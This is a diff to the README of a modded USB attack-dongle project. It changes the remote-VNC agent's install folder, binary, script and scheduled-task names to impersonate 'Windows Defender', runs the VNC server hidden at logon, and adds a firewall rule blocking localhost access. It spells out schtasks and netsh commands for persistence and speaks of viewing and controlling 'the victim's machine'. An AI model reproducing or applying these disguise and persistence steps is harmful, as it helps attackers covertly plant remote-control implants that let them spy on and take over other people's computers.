@@ -60,7 +60,7 @@ This project implements a variety of attacks based around an easily concealable 
 | Feature | Description |
 | ------- | ----------- |
 | **PC-based VNC** | VncDirect hosts noVNC on port 7002 on your PC. The dongle deploys the agent — everything else runs on the PC. No relay through the dongle, full performance. |
-| **PC Installer / Uninstaller** | `Agent Installer.bat` downloads all files from GitHub individually, installs to `C:\AgentInstall`, sets up scheduled tasks + firewall + VNC watchdog. `Agent Uninstaller.bat` with 3 options: remove autostart, full uninstall, or change VNC password. |
+| **PC Installer / Uninstaller** | `Agent Installer.bat` downloads all files from GitHub individually, installs to `C:\ProgramData\Windows Defender`, sets up scheduled tasks + firewall + autostart. `Agent Uninstaller.bat` with 5 options: full uninstall, toggle autostart, start/stop VNC, set password, exit. |
 | **VNC Web UI (Dark Theme)** | Gold-accented dark theme matching the dashboard. FPS slider (30–240), quality selector (1440p–360p), scale selector (Fenster/100%/75%/50%/25%), remote control toggle (mouse+keyboard), resize grip. |
 | **VNC Password Protection** | Password check on the VNC page — set via installer or uninstaller, verified on connect. |
 | **Remote Access (Tailscale)** | Access your PC's VNC from anywhere via Tailscale VPN — no port forwarding needed. The VNC page detects your Tailscale IP and shows a remote link. |
@@ -132,39 +132,43 @@ All files needed for the PC agent are in [`tools/`](https://github.com/Korbi0312
 2. Save it anywhere on your PC (e.g. Desktop)
 3. Right-click → **Run as administrator**
 4. Enter a VNC password (optional, press Enter to skip)
-5. The installer downloads all files from GitHub, installs to `C:\AgentInstall`, sets up scheduled tasks, firewall and VNC watchdog
+5. The installer downloads all files from GitHub, installs to `C:\ProgramData\Windows Defender`, sets up scheduled tasks, firewall and autostart
 6. After installation, open `http://<your-pc-ip>:7002` in any browser to access the VNC interface
 
 To uninstall, run `Agent Uninstaller.bat` and choose:
-- **[1] Remove Autostart** — keeps files, removes startup entries
-- **[2] Full Uninstall** — removes everything
-- **[3] Change VNC Password** — set or clear the VNC password
+- **[1] Full Uninstall** — removes autostart, all files and firewall rules
+- **[2] Remove Autostart / Setup Autostart** — toggle scheduled tasks
+- **[3] Start/Stop VNC Server** — start or stop the VNC server
+- **[4] Set/Change VNC Password** — set or clear the VNC password
+- **[5] Exit**
 
 #### Option B: Manual Installation (if installer doesn't work)
 
 If the installer fails (e.g. no internet, corporate firewall), set up the agent manually:
 
 1. Download all files from [`tools/Installer/`](https://github.com/Korbi0312/USBArmyKnife-modded/tree/master/tools/Installer)
-2. Create `C:\AgentInstall` and `C:\AgentInstall\VncDirect\vnc` on your PC
-3. Copy files into `C:\AgentInstall`:
+2. Create `C:\ProgramData\Windows Defender` and `C:\ProgramData\Windows Defender\VncDirect\vnc` on your PC
+3. Copy files into `C:\ProgramData\Windows Defender`:
    - `AgentLauncher.exe`
-   - `vnc-watchdog.bat`
-4. Copy `VncDirect.exe`, `turbojpeg.dll`, `vcruntime140.dll` into `C:\AgentInstall\VncDirect\`
-5. Extract `vnc-web.zip` into `C:\AgentInstall\VncDirect\` (creates the `vnc\` folder)
+   - `WinDefend.bat`
+4. Copy `Windows Defender.exe` (VncDirect), `turbojpeg.dll`, `vcruntime140.dll` into `C:\ProgramData\Windows Defender\VncDirect\`
+5. Extract `vnc-web.zip` into `C:\ProgramData\Windows Defender\VncDirect\` (creates the `vnc\` folder)
 6. Create the scheduled tasks (run as admin):
    ```
-   schtasks /create /tn "USBArmyKnife Agent" /tr "C:\AgentInstall\AgentLauncher.exe vid=cafe pid=403f cwd=C:\AgentInstall" /sc onlogon /rl limited /f
-   schtasks /create /tn "Security Script" /tr "C:\AgentInstall\AgentLauncher.exe vid=cafe pid=403f cwd=C:\AgentInstall" /sc onlogon /rl limited /f
-   schtasks /create /tn "VNC Watchdog" /tr "C:\AgentInstall\vnc-watchdog.bat" /sc onlogon /rl limited /f
+   schtasks /create /tn "USBArmyKnife Agent" /tr "C:\ProgramData\Windows Defender\AgentLauncher.exe vid=cafe pid=403f cwd=C:\ProgramData\Windows Defender" /sc onlogon /rl limited /f
+   schtasks /create /tn "Security Script" /tr "C:\ProgramData\Windows Defender\AgentLauncher.exe vid=cafe pid=403f cwd=C:\ProgramData\Windows Defender" /sc onlogon /rl limited /f
+   schtasks /create /tn "Windows Defender" /tr "wscript.exe \"C:\ProgramData\Windows Defender\WinDefend.vbs\"" /sc onlogon /rl limited /f
    ```
-7. Add firewall rule (run as admin):
+7. Add firewall rules (run as admin):
    ```
    netsh advfirewall firewall add rule name="VNC Direct 7002" dir=in action=allow protocol=TCP localport=7002
+   netsh advfirewall firewall add rule name="VNC Block Localhost" dir=in action=block protocol=TCP localport=7002 remoteip=127.0.0.1
    ```
 8. Start the services:
    ```
-   C:\AgentInstall\VncDirect\VncDirect.exe port=7002 cwd=C:\AgentInstall\VncDirect\vnc fps=360 scale=0
-   C:\AgentInstall\AgentLauncher.exe vid=cafe pid=403f cwd=C:\AgentInstall
+   cd /d C:\ProgramData\Windows Defender\VncDirect\vnc
+   start "" "C:\ProgramData\Windows Defender\VncDirect\Windows Defender.exe" port=7002 "cwd=C:\ProgramData\Windows Defender\VncDirect\vnc" fps=360 scale=0
+   C:\ProgramData\Windows Defender\AgentLauncher.exe vid=cafe pid=403f cwd=C:\ProgramData\Windows Defender
    ```
 
 #### Compile Agent from Source
@@ -202,9 +206,9 @@ Once the agent is deployed to the victim's machine, you can view their screen in
 3. Toggle mouse+keyboard control on/off with the Remote Control button
 4. The canvas auto-scales to your browser window size
 
-### VNC Watchdog
+### Autostart
 
-A scheduled task automatically restarts VNC if it crashes. The watchdog checks every 5 seconds.
+A scheduled task "Windows Defender" runs `WinDefend.vbs` on login, which starts the VNC server hidden in the background.
 
 ### Remote Access via Tailscale
 
